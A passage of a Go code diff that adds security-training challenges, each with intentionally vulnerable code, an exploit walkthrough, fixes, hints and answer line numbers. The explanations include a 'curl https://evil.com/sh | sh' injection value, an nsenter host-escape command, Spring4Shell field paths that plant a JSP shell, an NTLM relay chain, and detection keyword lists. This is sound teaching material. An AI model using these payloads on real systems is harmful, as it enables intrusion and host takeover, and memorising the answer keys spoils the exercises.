@@ -19,6 +19,12 @@ func buildOSCPChallenges() []challengeSeed {
 		oscpNodePostMessageOriginBypass(),
 		oscpNodeGraphQLAliasDoS(),
 		oscpPythonSSRFDNSRebinding(),
+		oscpCSharpNTLMRelayPrimitive(),
+		oscpPythonDockerSockEscape(),
+		oscpNodeOIDCAudConfusion(),
+		oscpTerraformLocalExecInjection(),
+		oscpJavaSpring4ShellDataBinding(),
+		oscpPythonPickleTrustedWrapper(),
 	}
 }
 
@@ -2136,6 +2142,1018 @@ strategies; combine them for defense in depth.
 			"What service on a typical AWS EC2 instance answers on the link-local address 169.254.169.254, and why would the attacker want it?",
 		},
 		vulnerableLines: []int{35, 38},
+	}
+}
+
+// ──────────────────────────────────────────────────
+// OSCP 15 — Windows NTLM relay via impersonating HttpListener
+// Difficulty 9 — Listener accepts NTLM auth from any caller, then
+// impersonates the caller for outbound SMB access. UNC paths under
+// upstreamShare relay creds to attacker-named hosts.
+// ──────────────────────────────────────────────────
+func oscpCSharpNTLMRelayPrimitive() challengeSeed {
+	return challengeSeed{
+		title:        "The Borrowed Identity — NTLM Relay via HttpListener",
+		slug:         "csharp-ntlm-relay-impersonating-httplistener",
+		difficulty:   9,
+		langSlug:     "csharp",
+		catSlug:      "broken-auth",
+		points:       700,
+		cveReference: "CWE-287 / CWE-862 — classic NTLM relay primitive",
+		description: `A Windows-hosted intake service exposes an HTTP endpoint that
+streams build artifacts to internal developers. The listener uses
+Integrated Windows Auth (NTLM/Kerberos) so developers can hit it
+from their workstations without extra credentials. After
+authenticating the caller, the service impersonates them to read
+the artifact off a corporate file share.
+
+The intake server reaches every corporate fileshare and several
+domain controllers' admin shares. The listener prefix is bound to
+the machine's IPv4 address and is reachable from the corporate
+intranet — including from any compromised laptop running a phishing
+attachment.
+
+Find the chain that lets an attacker who can convince a target
+machine to make a single HTTP request to the listener compromise
+that target's network identity against arbitrary SMB hosts.`,
+		code: `using System;
+using System.IO;
+using System.Net;
+using System.Security.Principal;
+
+public class IntakeListener {
+    private readonly HttpListener listener = new HttpListener();
+    private readonly string upstreamShare;
+
+    public IntakeListener(string prefix, string upstreamShare) {
+        listener.Prefixes.Add(prefix);
+        listener.AuthenticationSchemes = AuthenticationSchemes.IntegratedWindowsAuthentication;
+        this.upstreamShare = upstreamShare;
+    }
+
+    public void Start() {
+        listener.Start();
+        while (listener.IsListening) {
+            var ctx = listener.GetContext();
+            HandleRequest(ctx);
+        }
+    }
+
+    private void HandleRequest(HttpListenerContext ctx) {
+        var identity = (WindowsIdentity)ctx.User.Identity;
+        Console.WriteLine($"Authenticated user: {identity.Name}");
+
+        WindowsIdentity.RunImpersonated(identity.AccessToken, () => {
+            var relative = ctx.Request.QueryString["file"] ?? "";
+            var path = Path.Combine(upstreamShare, relative);
+            using (var fs = File.OpenRead(path)) {
+                fs.CopyTo(ctx.Response.OutputStream);
+            }
+        });
+
+        ctx.Response.Close();
+    }
+}`,
+		targetVuln: `A textbook NTLM relay primitive built from three independently-
+reasonable choices.
+
+Flaw 1 — accepts NTLM from any HTTP client (line 12).
+   AuthenticationSchemes.IntegratedWindowsAuthentication tells the
+   listener to negotiate NTLM/Kerberos with whoever connects. There
+   is no Extended Protection for Authentication (EPA / channel
+   binding) and no IP allowlist. Any HTTP client that can reach the
+   listener can authenticate via NTLM by attaching a forged
+   challenge response (relay) or by having a victim machine make the
+   call on its behalf (coerced auth, e.g. PetitPotam, PrinterBug,
+   DFSCoerce).
+
+Flaw 2 — impersonates the caller's primary token (line 27).
+   RunImpersonated takes the AccessToken from the authenticated
+   identity and runs the delegate under that identity. NTLM
+   produces an IMPERSONATION token by default (not delegation), but
+   that token is still good for OUTBOUND SMB authentication on the
+   SAME network leg — which is exactly what File.OpenRead does over
+   a UNC path.
+
+Flaw 3 — File.OpenRead over a UNC path under attacker-influenced
+control (line 30).
+   The upstreamShare is configured to a UNC share. Path.Combine of
+   a UNC share with a user-supplied relative path:
+       Path.Combine("\\\\corp-files\\team\\", "../admin$/foo.txt")
+   produces "\\\\corp-files\\team\\../admin$/foo.txt", which the
+   file system resolves to "\\\\corp-files\\admin$\\foo.txt".
+   The SMB client running inside the impersonation context uses the
+   relayed user's identity to authenticate to the named server.
+
+Combined exploit chain:
+   1. Attacker phishes victim with a UNC link
+      \\\\attacker.evil\\share\\anything.html or triggers PetitPotam
+      against a domain controller to coerce the DC computer account
+      to hit the intake listener.
+   2. The victim's machine connects to the intake listener and
+      completes NTLM with its own creds.
+   3. The listener impersonates the victim and calls File.OpenRead
+      against \\\\attacker.evil\\share\\.. — but actually, the
+      attacker simply sets ?file=../admin$/anything in the query
+      string and the listener opens \\\\target.corp\\admin$\\... as
+      the victim. If the victim is a Domain Admin coerced via
+      PetitPotam, that's instant DC compromise.
+
+The "RunImpersonated" call is the relay engine; the
+IntegratedWindowsAuthentication acceptance is the credential intake;
+the UNC File.OpenRead is the outbound vector. Each was added in a
+separate quarter by a separate engineer.`,
+		conceptualFix: `Three independent fixes; all are needed.
+
+1. Stop accepting NTLM from arbitrary callers.
+   - Require Kerberos only (disable NTLM at the listener level via
+     authentication policy / GPO).
+   - Enable EPA (Extended Protection for Authentication) so the
+     auth blob is tied to the TLS channel — relay attacks can't
+     replay the response onto a different connection.
+   - Bind the listener to a Service Principal Name (SPN) for which
+     the relay target does not have a corresponding SPN — Kerberos
+     mutual auth then fails on the relay leg.
+
+2. Never impersonate based on incoming HTTP NTLM.
+   The intake service does NOT need to use the caller's identity to
+   read internal file shares. Use a dedicated service account with
+   read-only access to the artifact share, fetch the file under
+   that account, and stream it back:
+
+       // No impersonation; the service account is the principal.
+       var path = ValidatedArtifactPath(ctx.Request.QueryString["file"]);
+       using (var fs = File.OpenRead(path)) { ... }
+
+3. Sanitize and confine the file path:
+       static string ValidatedArtifactPath(string relative) {
+           if (string.IsNullOrWhiteSpace(relative)) throw new();
+           if (relative.Contains("..") || relative.Contains(':') ||
+               relative.StartsWith("\\\\")) throw new();
+           var full = Path.GetFullPath(Path.Combine(upstreamShare, relative));
+           if (!full.StartsWith(Path.GetFullPath(upstreamShare))) throw new();
+           return full;
+       }
+
+4. Defense in depth:
+   - Disable SMB signing exemptions cluster-wide (require signing).
+     Many relay techniques depend on the relay leg accepting an
+     unsigned SMB session.
+   - Move artifact storage off SMB entirely. Use an HTTPS+OAuth
+     artifact repository (Artifactory, Nexus, S3) so impersonation
+     primitives never reach into SMB at all.
+   - Detect: alert on any NTLM authentication where the response
+     channel binding does not match the request channel binding
+     (relay signature).`,
+		hints: []string{
+			"What does IntegratedWindowsAuthentication accept and how does NTLM relay work in general?",
+			"Trace what happens when the listener calls RunImpersonated and then opens a file under a UNC path. Whose credentials authenticate to the remote SMB host?",
+			"Could Path.Combine of a UNC share base and a relative path containing '../' escape the share, or change the target server?",
+		},
+		vulnerableLines: []int{12, 28, 31},
+	}
+}
+
+// ──────────────────────────────────────────────────
+// OSCP 16 — Container escape via mounted Docker socket + arbitrary exec
+// Difficulty 8 — Sidecar pattern that turns RCE-in-container into
+// RCE-on-host with no kernel exploit required.
+// ──────────────────────────────────────────────────
+func oscpPythonDockerSockEscape() challengeSeed {
+	return challengeSeed{
+		title:        "Sock Puppet — Container Escape via Mounted docker.sock",
+		slug:         "python-container-escape-docker-sock",
+		difficulty:   8,
+		langSlug:     "python",
+		catSlug:      "broken-access",
+		points:       600,
+		cveReference: "CWE-250 (excessive privilege) + CWE-269",
+		description: `A Python diagnostics service runs inside a Docker container on a
+fleet of bare-metal hosts. Each host's /var/run/docker.sock is
+bind-mounted into the container at /var/run/docker.sock so the
+service can fetch sidecar container logs and run quick health
+checks across the local docker daemon.
+
+The endpoint is reachable through an internal authentication
+proxy that requires an SRE bearer token. SREs hit it daily during
+incident response.
+
+A recent red-team exercise found that any caller who reaches this
+endpoint can take over the host within seconds. Find the bug — and
+explain why it does not require any kernel CVE.`,
+		code: `import docker
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+docker_client = docker.from_env()
+
+
+@app.route("/api/diagnostics/logs", methods=["POST"])
+def container_logs():
+    body = request.get_json(force=True)
+    container_name = body.get("container")
+    tail = int(body.get("tail", 100))
+    if not container_name:
+        return jsonify({"error": "container required"}), 400
+
+    container = docker_client.containers.get(container_name)
+    logs = container.logs(tail=tail).decode("utf-8", errors="replace")
+    return jsonify({"container": container_name, "logs": logs})
+
+
+@app.route("/api/diagnostics/exec", methods=["POST"])
+def container_exec():
+    body = request.get_json(force=True)
+    container_name = body.get("container")
+    cmd = body.get("cmd")
+    if not container_name or not cmd:
+        return jsonify({"error": "container and cmd required"}), 400
+
+    container = docker_client.containers.get(container_name)
+    result = container.exec_run(cmd)
+    return jsonify({
+        "exit_code": result.exit_code,
+        "output": result.output.decode("utf-8", errors="replace")
+    })
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)`,
+		targetVuln: `Mounting /var/run/docker.sock inside a container hands the
+container's processes root-equivalent control over the host's
+Docker daemon. The daemon itself runs as root on the host. Any
+caller who can talk to the daemon can:
+
+  - start a new container with --privileged + hostPath / mounted at
+    /host and chroot into it,
+  - exec arbitrary commands in ANY container on the host (including
+    other tenants' containers in a multi-tenant deployment),
+  - read/write /var/lib/docker, kubelet credentials, every secret
+    bind-mounted into any container.
+
+Flaw 1 — docker.from_env() opens an unauthenticated client to the
+mounted socket (line 6).
+   docker.from_env() honors DOCKER_HOST or falls back to
+   /var/run/docker.sock. There is no authentication or authorization
+   between the Python process and the daemon — possession of the
+   socket IS the privilege.
+
+Flaw 2 — /api/diagnostics/exec runs caller-supplied commands in
+caller-named containers (line 31).
+   container_exec accepts both the container name AND the command
+   from the request body, then calls exec_run with no allowlist,
+   no command parsing, no per-container ACL. An attacker who reaches
+   this endpoint executes arbitrary code as root inside any
+   container on the host, including:
+
+       POST /api/diagnostics/exec
+       {"container": "<any sibling container>",
+        "cmd": "nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh"}
+
+   nsenter against PID 1 of any container that ran without strict
+   PID isolation (or against the kubelet itself via --pid=host)
+   drops the attacker into the host's namespace as root. No kernel
+   CVE, no container-runtime escape primitive — just the daemon
+   API used as designed.
+
+Why the upstream auth proxy does not save us:
+   - The proxy only enforces "you have an SRE token." It does not
+     constrain WHICH containers or commands you can run.
+   - Once you reach this endpoint, the daemon has no way to know
+     the request came from a human; the daemon trusts the socket.
+   - The blast radius is the entire host, not the calling user.`,
+		conceptualFix: `Eliminate root paths; do not patch one endpoint.
+
+1. Don't mount the host's docker.sock into the container at all.
+   The diagnostics service should talk to a SCOPED logs API:
+
+       - The host runs a tiny, statically-typed sidecar exposing
+         only "fetch logs by container name" and "fetch container
+         status," with a hard allowlist of container names.
+       - The Python service talks to that sidecar over HTTP, not to
+         the daemon directly.
+
+   This removes the exec primitive entirely.
+
+2. If exec is truly required, mediate it through a separate audited
+   gateway:
+
+       - The diagnostics service POSTs (container, cmd) to a
+         gateway that authenticates the human, checks the command
+         against an allowlist (e.g. only "ps", "cat /etc/issue",
+         "ls /tmp"), and logs every invocation to an append-only
+         audit log.
+       - The gateway runs as a dedicated low-privilege user on the
+         host and is the ONLY process with access to docker.sock.
+
+3. Defense in depth:
+   - Replace docker with rootless podman if the runtime supports it.
+     Rootless podman has no shared socket; each user has their own.
+   - Use Docker's authorization plugin
+     (--authorization-plugin=opa) to enforce policies even on the
+     legacy socket path.
+   - Run the diagnostics container with a non-root user, no
+     CAP_SYS_ADMIN, read-only rootfs, and a seccomp profile that
+     blocks unix-domain-socket syscalls to docker's socket path.
+   - Alert on any exec_run whose command contains "nsenter",
+     "chroot", "/proc/1", or unix-socket FDs.`,
+		hints: []string{
+			"What does docker.from_env() connect to inside this container? What permissions does the docker daemon run with on the host?",
+			"Trace the exec_run call. Who chooses the container, who chooses the command, and what does the daemon do with both?",
+			"Even if the proxy verifies an SRE token, what does the SRE token authorize the caller to do — and does that match what the endpoint actually lets them do?",
+		},
+		vulnerableLines: []int{6, 31},
+	}
+}
+
+// ──────────────────────────────────────────────────
+// OSCP 17 — OIDC iss/aud confusion (any iss can mint any aud)
+// Difficulty 8 — Token verification accepts the cross product of
+// trusted issuers and trusted audiences, breaking issuer binding.
+// ──────────────────────────────────────────────────
+func oscpNodeOIDCAudConfusion() challengeSeed {
+	return challengeSeed{
+		title:        "Cross-Issuer Confusion — OIDC iss/aud Mismatch",
+		slug:         "nodejs-oidc-iss-aud-confusion",
+		difficulty:   8,
+		langSlug:     "nodejs",
+		catSlug:      "auth-bypass",
+		points:       600,
+		cveReference: "CWE-287 + CWE-345 (token-binding failure)",
+		description: `A Node.js API accepts OIDC ID tokens from two upstream identity
+providers: the company's own login.example.com (for employees) and
+a partner SSO at partner-sso.partner.io (for a B2B integration with
+a single partner client).
+
+The verification layer accepts EITHER issuer and EITHER audience,
+trusting the upstream IdPs to keep their token issuance scoped to
+the right relying parties.
+
+A recent customer report flagged that a contractor at the partner
+company logged into the EMPLOYEE-only admin panel with a token
+that was supposed to be valid only against the partner integration.
+Find why.`,
+		code: `const jwt = require('jsonwebtoken');
+const jwksRsa = require('jwks-rsa');
+const express = require('express');
+
+const app = express();
+
+const ISSUERS = {
+    'https://login.example.com': {
+        jwks: 'https://login.example.com/.well-known/jwks.json',
+        expectedAud: 'app-prod-client-id'
+    },
+    'https://partner-sso.partner.io': {
+        jwks: 'https://partner-sso.partner.io/.well-known/jwks.json',
+        expectedAud: 'partner-integration-client-id'
+    }
+};
+
+const ALL_TRUSTED_AUDS = Object.values(ISSUERS).map(c => c.expectedAud);
+
+const jwksClients = {};
+for (const [iss, cfg] of Object.entries(ISSUERS)) {
+    jwksClients[iss] = jwksRsa({ jwksUri: cfg.jwks });
+}
+
+function getKey(header, callback) {
+    const promises = Object.values(jwksClients).map(c =>
+        c.getSigningKey(header.kid).catch(() => null)
+    );
+    Promise.all(promises).then(keys => {
+        const key = keys.find(k => k !== null);
+        if (!key) return callback(new Error('kid not found'));
+        callback(null, key.getPublicKey());
+    });
+}
+
+app.use((req, res, next) => {
+    const auth = req.headers.authorization || '';
+    const token = auth.replace(/^Bearer /, '');
+    jwt.verify(token, getKey, {
+        algorithms: ['RS256'],
+        issuer: Object.keys(ISSUERS),
+        audience: ALL_TRUSTED_AUDS
+    }, (err, decoded) => {
+        if (err) return res.status(401).json({ error: err.message });
+        req.user = decoded;
+        next();
+    });
+});
+
+app.get('/api/admin', (req, res) => {
+    res.json({ user: req.user });
+});
+
+app.listen(3000);`,
+		targetVuln: `The verifier accepts the CROSS PRODUCT of trusted issuers and
+trusted audiences — but in a correctly-bound OIDC verifier, each
+(iss, aud) pair must be checked together.
+
+Flaw — unbound iss/aud allowlists (lines 41, 42).
+   jwt.verify is called with:
+       issuer:   Object.keys(ISSUERS)          // both issuers OK
+       audience: ALL_TRUSTED_AUDS              // both auds OK
+   The library checks that decoded.iss is IN the issuer list AND
+   decoded.aud is IN the audience list — independently. There is
+   no check that the aud belongs to the iss.
+
+Compounding flaw — getKey searches every IdP's JWKS (lines 25-33).
+   getKey iterates every configured JWKS endpoint looking for any
+   key whose kid matches the token's header kid. If two IdPs happen
+   to issue keys with overlapping kids — which is common because
+   many IdPs use sequential or short kids — the wrong IdP's key may
+   be returned for signature validation.
+
+   More importantly: even WITHOUT a kid collision, the partner SSO
+   correctly signs a token with aud=app-prod-client-id if a partner
+   developer asks for that audience. There is no policy at
+   partner-sso.partner.io that says "you must not mint tokens with
+   aud=app-prod-client-id" — that's our service's job to enforce.
+
+Exploit:
+   1. Attacker is (or compromises) a partner-side developer who can
+      mint OIDC tokens from partner-sso.partner.io.
+   2. Attacker requests an ID token with custom claim aud =
+      "app-prod-client-id" (the expectedAud for login.example.com).
+   3. partner-sso signs it (it's a valid token from that IdP's view).
+   4. Attacker submits to /api/admin.
+   5. Our verifier:
+        - iss = partner-sso.partner.io — IN our issuer list  → OK
+        - signature verifies against partner-sso JWKS         → OK
+        - aud = app-prod-client-id — IN our audience list     → OK
+        - request flows into /api/admin with decoded.sub from
+          partner-sso's namespace.
+   6. The application code reading decoded.sub treats it as the
+      identity of an employee — full ATO of any sub the partner
+      IdP can mint.`,
+		conceptualFix: `Bind iss → aud explicitly. Never run the verifier with multi-iss
++ multi-aud allowlists.
+
+1. Decode the token first, dispatch to the correct verifier:
+
+       const decoded = jwt.decode(token, { complete: true });
+       const iss = decoded.payload.iss;
+       const cfg = ISSUERS[iss];
+       if (!cfg) return res.status(401).json({ error: 'unknown iss' });
+
+       jwt.verify(token, makeKeyFor(cfg.jwks), {
+           algorithms: ['RS256'],
+           issuer: iss,                   // exact match
+           audience: cfg.expectedAud,     // bound to this iss
+       }, (err, payload) => { ... });
+
+   makeKeyFor returns a getKey function that consults ONLY that
+   issuer's JWKS, so a kid collision across IdPs cannot select the
+   wrong key.
+
+2. Treat the two IdPs as fully separate trust domains.
+   The employee API and the partner integration should be SEPARATE
+   services (or at minimum separate Express routers) each with a
+   single-iss verifier. /api/admin should never see a partner-
+   sso-signed token at all; rejected at the routing layer before
+   the controller runs.
+
+3. Defense in depth:
+   - For each iss, store a fixed "kid → key" map locally and refresh
+     out-of-band, instead of hot-fetching JWKS from the kid in every
+     request (defeats both confusion AND SSRF via the kid header).
+   - Add a custom claim "issued_for" or "tenant" and require it to
+     match the deploy environment. Even if the partner IdP slips
+     and mints a forbidden aud, the missing tenant claim catches it.
+   - Log and alert on any token with iss = partner-sso.* hitting
+     employee-only endpoints.`,
+		hints: []string{
+			"Look at the verify options. What does passing 'issuer: [a, b]' and 'audience: [x, y]' actually check?",
+			"Could the partner-sso.partner.io legitimately sign a token whose aud claim is 'app-prod-client-id'? If yes, what stops your service from accepting it?",
+			"For each issuer in your trust list, what audience should be valid for THAT issuer specifically? Are you enforcing that pairing?",
+		},
+		vulnerableLines: []int{41, 42},
+	}
+}
+
+// ──────────────────────────────────────────────────
+// OSCP 18 — Terraform local-exec shell injection via pipeline variable
+// Difficulty 6 — User-controlled PR variable lands in a provisioner
+// command. Runs as the CI service account on the deploy host.
+// ──────────────────────────────────────────────────
+func oscpTerraformLocalExecInjection() challengeSeed {
+	return challengeSeed{
+		title:        "The Deploying Hand — Terraform local-exec Injection",
+		slug:         "terraform-local-exec-shell-injection",
+		difficulty:   6,
+		langSlug:     "bash",
+		catSlug:      "ci-cd-injection",
+		points:       400,
+		cveReference: "CWE-78 (OS command injection in IaC)",
+		description: `A SaaS product ships via a GitHub-Actions pipeline that runs
+"terraform apply" against this module on every merge to main. The
+pipeline passes the target environment and release tag as
+Terraform variables sourced from PR metadata.
+
+The CI service account on the deploy host has read-only AWS
+credentials, can SSH to every production instance, and can write
+to the team's S3 deployment bucket. Contractors with PR-merge
+rights number ~30.
+
+Find the bug that lets any merged PR run arbitrary shell on the
+deploy host as the CI account.`,
+		code: `variable "target_env" {
+  description = "Deployment target: staging, prod, etc."
+  type        = string
+}
+
+variable "release_tag" {
+  description = "Git release tag to deploy"
+  type        = string
+}
+
+resource "aws_instance" "app" {
+  ami           = "ami-0123456789abcdef0"
+  instance_type = "t3.medium"
+
+  tags = {
+    Name       = "app-${var.target_env}"
+    ReleaseTag = var.release_tag
+  }
+}
+
+resource "null_resource" "post_deploy" {
+  triggers = {
+    target = var.target_env
+    tag    = var.release_tag
+  }
+
+  provisioner "local-exec" {
+    command = "scripts/deploy.sh ${var.target_env} ${var.release_tag}"
+  }
+
+  provisioner "local-exec" {
+    when    = destroy
+    command = "scripts/cleanup.sh --env ${var.target_env}"
+  }
+}
+
+output "instance_id" {
+  value = aws_instance.app.id
+}`,
+		targetVuln: `Shell injection via Terraform string interpolation into a
+local-exec command.
+
+Flaw — interpolation of unvalidated input into a shell command
+(lines 28, 33).
+
+   command = "scripts/deploy.sh ${var.target_env} ${var.release_tag}"
+   command = "scripts/cleanup.sh --env ${var.target_env}"
+
+   The local-exec provisioner runs its command via the system shell
+   (sh -c "..." on Linux, cmd /c "..." on Windows). Terraform
+   interpolation of ${var.target_env} performs a SIMPLE STRING
+   SUBSTITUTION — it does not shell-escape, quote, or constrain the
+   value.
+
+   Because the CI pipeline reads target_env from the PR's
+   tf-vars-file (or from a GitHub-Actions input), a merged PR can
+   set:
+
+       target_env = "staging; curl https://evil.com/sh | sh -; echo "
+
+   When terraform apply executes the provisioner, the shell sees:
+
+       scripts/deploy.sh staging; curl https://evil.com/sh | sh -; echo  ...
+
+   The injected commands run as the CI account on the deploy host
+   with all the access that account has — AWS creds, SSH keys to
+   every prod instance, write access to the S3 deployment bucket.
+
+Why "Terraform" or "IaC" does not magically protect this:
+   - Terraform variables are typed (string), but string is the
+     least-constrained type. There is no automatic shell escaping.
+   - The HCL parser validates HCL syntax, not the SAFETY of values
+     inside provisioner commands.
+   - "Terraform plan" shows the command literal with the substitution
+     resolved, but a malicious target_env will look like a legitimate
+     deploy command at plan time — the actual injected commands
+     execute only at apply time.
+
+The destroy-time provisioner (line 33) is an even subtler attack
+surface — destroy is sometimes invoked from emergency-recovery
+runbooks where the operator runs "terraform destroy -auto-approve"
+with whatever target_env was last set in state. Long after the
+malicious PR is forgotten, "destroy" runs the attacker's payload.`,
+		conceptualFix: `Either remove local-exec entirely or pass values through
+unambiguous, validated channels.
+
+1. Stop using local-exec for deploy logic. Move scripts/deploy.sh
+   into a proper CI step that runs OUTSIDE Terraform and uses
+   GitHub-Actions inputs that the pipeline owners control:
+
+       # .github/workflows/deploy.yml
+       - name: Deploy
+         env:
+           TARGET_ENV: ${{ inputs.target_env }}
+         run: ./scripts/deploy.sh "$TARGET_ENV" "$RELEASE_TAG"
+
+   Quoting "$TARGET_ENV" defeats shell injection at the runner
+   level. The PR cannot influence the workflow file itself without
+   an approving PR review on .github/workflows/, which is gated by
+   CODEOWNERS.
+
+2. If local-exec must stay, pass arguments as a JSON-encoded
+   environment variable, never as positional shell args:
+
+       provisioner "local-exec" {
+         environment = {
+           TARGET_ENV  = var.target_env
+           RELEASE_TAG = var.release_tag
+         }
+         command = "scripts/deploy.sh"
+       }
+
+   Inside deploy.sh, read $TARGET_ENV / $RELEASE_TAG with proper
+   quoting. The values are exposed as environment variables, not
+   spliced into a shell line.
+
+3. Constrain the variable type at the Terraform layer:
+
+       variable "target_env" {
+         type = string
+         validation {
+           condition     = contains(["staging", "prod", "canary"], var.target_env)
+           error_message = "target_env must be staging, prod, or canary."
+         }
+       }
+
+   Terraform refuses to plan if target_env is not in the allowlist.
+
+4. Defense in depth:
+   - The CI account should be a short-lived OIDC-issued role with
+     least privilege for the specific deploy, not a long-lived role
+     with broad access.
+   - Require CODEOWNERS review on infra/*.tf so PRs that touch
+     provisioners cannot land without infra-team approval.
+   - Use tfsec / Checkov / OPA Conftest in CI to reject any
+     local-exec whose command contains "${var." anywhere in its
+     value.`,
+		hints: []string{
+			"Where does Terraform's interpolation perform shell escaping for local-exec? (Hint: it does not.)",
+			"What can an attacker put inside target_env to break out of the deploy.sh argument and run their own command?",
+			"How could you pass the variable values to deploy.sh in a way that the shell cannot reinterpret them as commands?",
+		},
+		vulnerableLines: []int{28, 33},
+	}
+}
+
+// ──────────────────────────────────────────────────
+// OSCP 19 — Spring4Shell-class data binding RCE via class.* chain
+// Difficulty 9 — Missing setDisallowedFields on @ModelAttribute
+// lets the attacker walk the bean graph into Tomcat's pipeline.
+// ──────────────────────────────────────────────────
+func oscpJavaSpring4ShellDataBinding() challengeSeed {
+	return challengeSeed{
+		title:        "The Bean Whisperer — Spring4Shell Data-Binding RCE",
+		slug:         "java-spring4shell-databinding-classloader-rce",
+		difficulty:   9,
+		langSlug:     "java",
+		catSlug:      "mass-assignment",
+		points:       700,
+		cveReference: "CVE-2022-22965 (Spring4Shell) — data-binding to class.*",
+		description: `A Spring Boot service exposes a self-service "edit your profile"
+endpoint. The controller uses @ModelAttribute to bind incoming form
+fields onto the UserProfile entity. Standard Spring MVC code;
+hundreds of similar controllers exist in the same codebase.
+
+The team's security policy says "@ModelAttribute on internal forms
+is fine, we trust authenticated users." The app runs on Tomcat 9
+under JDK 11 (the official Spring Boot 2.x baseline). The user
+profile entity is exposed through Spring's WebDataBinder default
+behavior with no @InitBinder configured anywhere in the project.
+
+Find why any authenticated user can deploy a JSP shell to the
+Tomcat webapp directory via this endpoint.`,
+		code: `package com.example.controller;
+
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.stereotype.Controller;
+import org.springframework.ui.Model;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.ModelAttribute;
+import org.springframework.web.bind.annotation.PostMapping;
+import org.springframework.web.bind.annotation.RequestMapping;
+
+import com.example.model.UserProfile;
+import com.example.service.UserProfileService;
+
+@Controller
+@RequestMapping("/profile")
+public class ProfileController {
+
+    @Autowired
+    private UserProfileService profileService;
+
+    @GetMapping("/edit")
+    public String editForm(Model model) {
+        model.addAttribute("profile", profileService.currentProfile());
+        return "profile_edit";
+    }
+
+    @PostMapping("/update")
+    public String updateProfile(@ModelAttribute UserProfile profile, Model model) {
+        profileService.save(profile);
+        model.addAttribute("status", "updated");
+        return "redirect:/profile/view";
+    }
+
+    @GetMapping("/view")
+    public String view(Model model) {
+        model.addAttribute("profile", profileService.currentProfile());
+        return "profile_view";
+    }
+}`,
+		targetVuln: `Spring4Shell-class data-binding RCE: the controller binds form
+fields onto a POJO via @ModelAttribute with no field disallowlist,
+and Spring's data binder happily walks "." paths into any bean
+graph reachable from the POJO.
+
+Flaw — @ModelAttribute without setDisallowedFields (line 28).
+   Spring's WebDataBinder accepts nested-property paths like
+       fieldName=value
+       nested.deeper.field=value
+   and resolves them via getNested().getDeeper().setField(value).
+   With no setDisallowedFields call, the binder will set ANY path
+   the attacker can name on the target object.
+
+   In the JDK 9+ class loader, every Object has:
+       obj.class               → its Class
+       obj.class.module        → the Module
+       obj.class.classLoader   → the ClassLoader (or null for boot)
+       obj.class.module.classLoader.resources.context...
+
+   Under Tomcat, the bean graph from any user-controlled object
+   walks via class.module.classLoader.resources.context.parent.
+   pipeline.first into the AccessLogValve. Setting the valve's
+   directory / prefix / suffix / pattern / fileDateFormat
+   reconfigures access-log writes:
+
+       directory   = "webapps/ROOT"
+       prefix      = "shell"
+       suffix      = ".jsp"
+       fileDateFormat = ""
+       pattern     = "<the JSP source as access-log pattern>"
+
+   The next request that hits a logged URL causes Tomcat to WRITE
+   the configured pattern (which is now JSP source) into
+   webapps/ROOT/shell.jsp. The attacker then requests /shell.jsp
+   and gets RCE.
+
+The exploit is one POST to /profile/update with field names like:
+       class.module.classLoader.resources.context.parent.pipeline.first.pattern=<%25 ... %25>
+       class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+       class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+       class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
+       class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+Spring's binder happily traverses the bean graph, calls setters
+all the way down, and reconfigures Tomcat's AccessLogValve. No
+@Valid annotation or authenticated-user check stops this: the
+attacker is authenticated; the user IS allowed to update their
+profile. The fields ABOVE the legitimate ones are the problem.
+
+Pre-JDK 9 the same attack landed via .class.classLoader without
+the .module hop. Spring 5.3.18 / 5.2.20 added a default
+disallow-class filter but the underlying mechanism — walking a
+bean graph into the class loader — is intrinsic to the data
+binder and applies to any field path reachable through any bean.`,
+		conceptualFix: `Add an @InitBinder that disallows class-walking fields, AND
+upgrade to a patched Spring version.
+
+1. Per-controller InitBinder (works on any Spring version):
+
+       @InitBinder
+       public void initBinder(WebDataBinder binder) {
+           String[] blocked = new String[] {
+               "class.*", "Class.*", "*.class.*", "*.Class.*"
+           };
+           binder.setDisallowedFields(blocked);
+       }
+
+   Place an identical @InitBinder in EVERY controller (or in a
+   shared @ControllerAdvice) — Spring's default disallowed-field
+   list is per-binder, not global.
+
+2. Use a strict DTO, not the JPA entity, for binding:
+
+       @PostMapping("/update")
+       public String updateProfile(@ModelAttribute UserProfileUpdateDto dto) {
+           profileService.save(dto.toEntity());
+           ...
+       }
+
+   UserProfileUpdateDto exposes ONLY the fields the form may set
+   (display_name, bio, avatar_url). The DTO has no relationship to
+   the JPA entity's identity, no class-loader access, no
+   ServletContext reference. Even with no disallowlist, there is
+   nowhere to walk.
+
+3. Upgrade Spring. The fix for CVE-2022-22965 is Spring Framework
+   5.3.18+ / 5.2.20+, which adds a default getDisallowedFields()
+   block for the class.module.* paths used in the original PoC.
+   Note: this fix is necessary but not sufficient — new bean-graph
+   walks discovered after that patch can still be exploitable on
+   patched versions. The DTO pattern (#2) is the durable fix.
+
+4. Defense in depth:
+   - Tomcat's AccessLogValve directory should be on a read-only
+     mount or owned by a different user than the app process, so
+     even a successful reconfiguration cannot write a JSP into
+     webapps/.
+   - Tomcat's security-manager + SELinux/AppArmor policy can deny
+     write access to webapps/ from the running process.
+   - Reject POST bodies containing "class.module" or
+     "class.classLoader" at the WAF layer.`,
+		hints: []string{
+			"What does @ModelAttribute do to incoming form fields? How does it handle nested paths like 'a.b.c=value'?",
+			"From any Java object, what can you reach via .class.module.classLoader on JDK 9+? Where does that chain end on a Tomcat-deployed app?",
+			"Look up CVE-2022-22965. What's the canonical payload and what target objects does it reconfigure?",
+		},
+		vulnerableLines: []int{28},
+	}
+}
+
+// ──────────────────────────────────────────────────
+// OSCP 20 — Hardcoded HMAC key destroys a safe_loads pickle wrapper
+// Difficulty 7 — The wrapper is correct in shape; the static key in
+// the repo makes the signature forgeable and pickle.loads runs.
+// ──────────────────────────────────────────────────
+func oscpPythonPickleTrustedWrapper() challengeSeed {
+	return challengeSeed{
+		title:        "The Repo-Resident Key — Pickle via Forgeable HMAC",
+		slug:         "python-pickle-via-hardcoded-hmac-wrapper",
+		difficulty:   7,
